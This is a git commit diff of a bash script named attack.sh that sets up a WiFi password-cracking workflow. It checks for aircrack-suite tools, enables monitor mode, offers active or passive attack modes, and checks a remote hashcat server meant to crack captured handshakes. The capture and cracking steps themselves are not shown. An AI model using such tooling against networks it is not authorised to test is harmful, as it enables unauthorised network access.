ecab0e4719dbac5a18551277ed7b0ed16bf8ed6b
rinamuka <58566654+rinamuka@users.noreply.github.com>
2021-08-21 23:12:15 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -4,44 +4,86 @@ interface=""
 serverAddr=""
 
 checkUtils(){
-        printf "Check utilities...\n"
+        printf "Check utilities\n"
 
         #airmon-ng
         output=$(airmon-ng)
         if [[ "$output" == *"PHY"* ]]; then
-                printf "airmon-ng....Done\n"
+
+                printf "airmon-ng....\033[32m Done\033[0m\n"
         else
-                printf "airmon-ng....Fail\n"
+                printf "airmon-ng....\033[31m Fail \033[0m\n"
+                exit 1
         fi
 
         #airodump-ng
         output=$(airodump-ng)
         if [[ "$output" == *"usage: airodump-ng"* ]]; then
-                printf "airodump-ng....Done\n"
+                printf "airodump-ng....\033[32m Done\033[0m\n"
         else
-                printf "airodump-ng....Fail\n"
+                printf "airodump-ng....\033[31m Fail \033[0m\n"
+                exit 1
         fi
+
+        #cap2hccapx
+        output=`cap2hccapx 2>&1`
+        if [[ "$output" == *"usage: cap2hccapx input.pcap output.hccapx"* ]]; then
+                printf "cap2hccapx....\033[32m Done\033[0m\n"
+        else
+                printf "cap2hccapx....\033[31m Fail \033[0m\n"
+                exit 1
+        fi
+
         printf "\n"
 }
 
 
-#checkServer(){}
+checkServer(){
+        curl http://$serverAddr/handshakes &> /dev/null
+        if [[ $? == 0 ]]; then
+                printf "Server status - \033[32m working \033[0m\n"
+        else
+                printf "Server status - \033[31m not working \033[0m\n"
+                exit 1
+        fi
+}
 
 #checkInterface(){}
 
 getparams(){
-        printf "Please set the wireless interface(e.g. wlan0):\n"
+        printf "Please select an action:\n"
+        printf "1) Start active attack\n2) Start passive attack\n3) Get crack results\n"
         read;
-        interface=${REPLY}
-        airmon-ng start $interface
+        re='^[0-9]+$'
+        if ! [[ ${REPLY} =~ $re ]] || [[ ${REPLY} >3 ]]; then
+                printf "Invalid input.\n"
+                getparams
+        fi
 
-        printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\n"
-        read;
-        serverAddr=${REPLY}
+        if [[ ${REPLY} == 1 ]] || [[ ${REPLY} == 2 ]] ;then
+                printf "Please set the wireless interface(e.g. wlan0):\n"
+                read;
+                interface=${REPLY}
+                output=$(airmon-ng start $interface)
+                if [[ "$output" == *"monitor mode vif enabled for"* ]] || [[ "$output" == *"monitor mode already enabled"* ]]; then
+                        printf "Monitor mode on $interface \033[32m ....Enabled \033[0m\n"
+                else
+                        printf "Monitor mode failed enable on $interface \033[31m .... Fail \033[0m\n"
+                        exit 1
+                fi
 
-        printf "Please set the attack mode(active or passive)\n"
-        read;
-        mode=${REPLY}
+                printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\n"
+                read;
+                serverAddr=${REPLY}
+                checkServer
+        else if [[ ${REPLY} == 3 ]];then
+                printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\n"
+                read;
+                serverAddr=${REPLY}
+                checkServer
+        fi
+        fi
+
 }
 
 cleanup(){
@@ -54,5 +96,4 @@ main(){
         checkUtils
         getparams
 }
-
 main
